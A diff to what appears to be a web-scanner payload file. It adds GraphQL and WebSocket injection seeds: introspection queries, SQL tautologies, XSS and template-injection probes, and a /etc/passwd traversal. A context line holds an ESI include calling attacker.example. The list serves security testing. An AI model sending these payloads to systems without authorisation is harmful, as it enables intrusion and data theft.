@@ -204,6 +204,23 @@ SEEDS: dict[str, list[str]] = {
         "<!--#printenv-->",
         "<esi:include src=\"http://attacker.example/\" />",   # ESI injection
     ],
+    "GraphQL Injection": [
+        '{ __schema { queryType { name } types { name fields { name } } } }',
+        '{ __type(name: "User") { fields { name type { name } } } }',
+        "query { search(q: \"' OR 1=1--\") { id } }",
+        "mutation { login(email: \"' OR 1=1--\", password: \"x\") { token } }",
+        r'[{"query":"{ __typename }"},{"query":"{ search(q:\"\'  OR 1=1--\") { id } }"}]',
+        "{ a1: search(q: \"' OR 1=1--\") { id } a2: search(q: \"' OR 1=1--\") { id } }",
+        "query { search(q: \"<script>alert(1)</script>\") { id } }",
+    ],
+    "WebSocket Injection": [
+        '42["message","\' OR 1=1--"]',
+        '42["message","<script>alert(1)</script>"]',
+        '42["message","{{7*7}}"]',
+        '42["chatMessage","\' UNION SELECT 1--"]',
+        '42["search","\' OR 1=1--"]',
+        '42["message","../../../../etc/passwd"]',
+    ],
 }
 
 
@@ -255,6 +272,10 @@ CLASS_ALIASES: dict[str, str] = {
     "redirect": "Open Redirect",
     "ldap": "LDAP Injection",
     "ssi": "SSI",
+    "graphql": "GraphQL Injection",
+    "gql": "GraphQL Injection",
+    "ws": "WebSocket Injection",
+    "websocket": "WebSocket Injection",
 }
 
 
